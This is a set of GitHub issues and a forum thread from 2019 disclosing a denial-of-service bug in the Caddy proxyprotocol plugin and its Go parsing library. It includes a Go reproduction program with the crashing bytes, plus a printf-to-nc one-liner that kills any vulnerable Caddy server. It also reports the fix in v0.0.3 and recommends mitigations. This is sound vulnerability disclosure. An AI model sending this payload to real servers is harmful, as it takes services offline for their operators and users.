## Description

![@cpu](https://avatars.githubusercontent.com/u/292650?u=44134c07dfdd2f96e2136d7cb5a0c5129893f5e6&v=4&size=48)[cpu](https://github.com/cpu)opened [on Jul 22, 2019](https://github.com/mastercactapus/caddy-proxyprotocol/issues/8#issue-471246004)

I opened an issue describing a DoS vulnerability in the `github.com/mastercactapus/proxyprotocol` package used by this plugin: [mastercactapus/proxyprotocol#1](https://github.com/mastercactapus/proxyprotocol/issues/1)

This code is the only consumer of the package I was able to find with light googling/github searching.

Since fixing the `mastercactapus/proxyprotocol` parsing bug will require an updated version of this plugin I wanted to file an issue here as well so it doesn't fall through the cracks.

Configuring the plugin with a source address filter is one potential mitigation in the short term.

The documentation would greatly benefit from strong language encouraging the use of a source address filter in **all** circumstances since above-and-beyond the current bug omitting such a filter will allow any client to spoof the IP metadata processed by the plugin. E.g. Apache's equivalent documentation says:

> It is critical to only enable this behavior from intermediate hosts (proxies, etc) which are trusted by this server, since it is trivial for the remote useragent to impersonate another useragent.

# [DoS in http.proxyprotocol plugin](/t/dos-in-http-proxyprotocol-plugin/6014)

I wasn’t able to find any information about how to report security vulnerabilities in Caddy or Caddy plugins on the Caddy homepage so I figured a community forum thread would be appropriate disclosure.

I discovered a class of trivial DoS bugs in the HAProxy PROXY V2 parsing in the [http.proxyprotocol](https://caddyserver.com/docs/http.proxyprotocol) Caddy plugin.

I opened the following Github issues with details and reproduction steps (including a Caddyfile and sample panic output from Caddy v1.0.1):

* <https://github.com/mastercactapus/proxyprotocol/issues/1>
* [Denial of service vulnerability with invalid v2 PROXY data · Issue #8 · mastercactapus/caddy-proxyprotocol · GitHub](https://github.com/mastercactapus/caddy-proxyprotocol/issues/8)

As I mentioned in [the plugin issue](https://github.com/mastercactapus/caddy-proxyprotocol/issues/8) the documentation for this plugin should be much stronger in its language to recommend a source address filter. Using a filter would help mitigate this vulnerability and I recommend users of this plugin ensure that they have such a filter configured until the `github.com/mastercactapus/proxyprotocol` package and the `caddy-proxyprotocol` plugin have been updated with a fix.

More importantly without using a filter this plugin lets anyone able to send a request to the Caddy server spoof IP metadata (by design). Other webservers (e.g. Apache) that support the HAProxy PROXY protocol include an explicit warning like:

> It is critical to only enable this behavior from intermediate hosts (proxies, etc) which are trusted by this server, since it is trivial for the remote useragent to impersonate another useragent.

No such warning is present in the Caddy plugin documentation and I think that’s a clear area for improvement.

Thanks,

One potential help here would be if the project maintainers could add a [security.txt](https://securitytxt.org/) document to <https://caddyserver.com/.well-known/security.txt>

> I opened the following Github issues with details and reproduction steps (including a Caddyfile and sample panic output from Caddy v1.0.1):

Here’s a quick standalone way to check if your Caddy server is vulnerable from a Linux host:

```
printf "\x0D\x0A\x0D\x0A\x00\x0D\x0A\x51\x55\x49\x54\x0A\x21\x12\x00\x00" | nc <caddy hostname> <caddy HTTPS port>

```

If the server is configured with `proxyprotocol` and there is no configured filter, or the filter allows the sender IP, the request generated with the above command will terminate the Caddy process on the server.

The `caddy-proxyprotocol` developer has [published a new version (`v0.0.3`) of the plugin](https://github.com/mastercactapus/caddy-proxyprotocol/releases/tag/v0.0.3) that fixes the identified vulnerability.

Many thanks to @mastercactapus for the very quick turn around! ![:tada:](https://caddy.community/images/emoji/apple/tada.png?v=11 ":tada:")

## Description

![@cpu](https://avatars.githubusercontent.com/u/292650?u=44134c07dfdd2f96e2136d7cb5a0c5129893f5e6&v=4&size=48)[cpu](https://github.com/cpu)opened [on Jul 22, 2019](https://github.com/mastercactapus/proxyprotocol/issues/1#issue-471244895)

👋 hi [@mastercactapus](https://github.com/mastercactapus), I was looking into the HAProxy V2 PROXY protocol and found your package. Unfortunately I found a class of crasher bugs when the library is presented malformed input.

The `headerv2.go`'s `parseV2` function doesn't validate that the length of the buffered data is large enough to ensure that the slicing done to extract src/dest IP addresses (and ports where applicable) won't be out of bounds.

Here's a small reproduction program:

```
package main

import (
	"bufio"
	"bytes"

	"github.com/mastercactapus/proxyprotocol"
)

func main() {
	data := []byte{
		// PROXY protocol v2 magic header
		0x0D, 0x0A, 0x0D, 0x0A, 0x00, 0x0D, 0x0A, 0x51, 0x55, 0x49, 0x54, 0x0A,
		// v2 version, PROXY cmd
		0x21,
		// TCP, IPv4 (also works with 0x13,0x21,0x22,0x31,0x32)
		0x12,
		// Length
		0x00, 0x00,
		// src/dest address data _should_ be here but is omitted.
	}

	/*
		panic: runtime error: slice bounds out of range

		goroutine 1 [running]:
		github.com/mastercactapus/proxyprotocol.parseV2(0xc00005e180, 0x100d, 0x0, 0x0)
			/home/daniel/go/src/github.com/mastercactapus/proxyprotocol/headerv2.go:93 +0x18e4

			/home/daniel/go/src/github.com/mastercactapus/proxyprotocol/parse.go:31 +0x149
		main.main()
			/home/daniel/test.go:21 +0x18f
		exit status 2
	*/
	_, _ = proxyprotocol.Parse(
		bufio.NewReader(
			bytes.NewReader(data)))
}

```

The inline comment shows where the panic occurs. You can change the panic location by switching the `0x12` byte to one of the other supported `FamProto` values in the [parsing switch statement](https://github.com/mastercactapus/proxyprotocol/blob/0ca1f90d2060630422ed80b31e47ea8195566910/headerv2.go#L80-L135). All supported `FamProto`'s are affected by this class of bug.

Notably this results in a trivial denial of service attack against upstream consumers of this package. I was able to reproduce this crash with your [caddy-proxyprotocol](https://github.com/mastercactapus/caddy-proxyprotocol) plugin, Caddy v1.0.1 and the following Caddy file:

```
beta.threeletter.agency:443

log access.log

root /var/www/test

proxyprotocol {
  timeout 3s
}

```

Here's the output from the Caddy server after receiving the payload from the reproduction above:

```
#> caddy -version
Caddy v1.0.1 (h1:oor6ep+8NoJOabpFXhvjqjfeldtw1XSzfISVrbfqTKo=)

```

I think its likely worth treating this as a denial of service vulnerability and releasing a new version of both this library and the upstream `caddy-proxyprotocol` plugin with a note indicating users should upgrade. As an additional note because of when this panic occurs there is no audit trail in the configured `access.log` and it brings down the entire webserver, not just the Go routine handling the request.

Unfortunately I don't have the cycles to develop a fix for this bug. I'm not a Caddy user or a `caddy-proxyprotocol` user, just a curious dev.
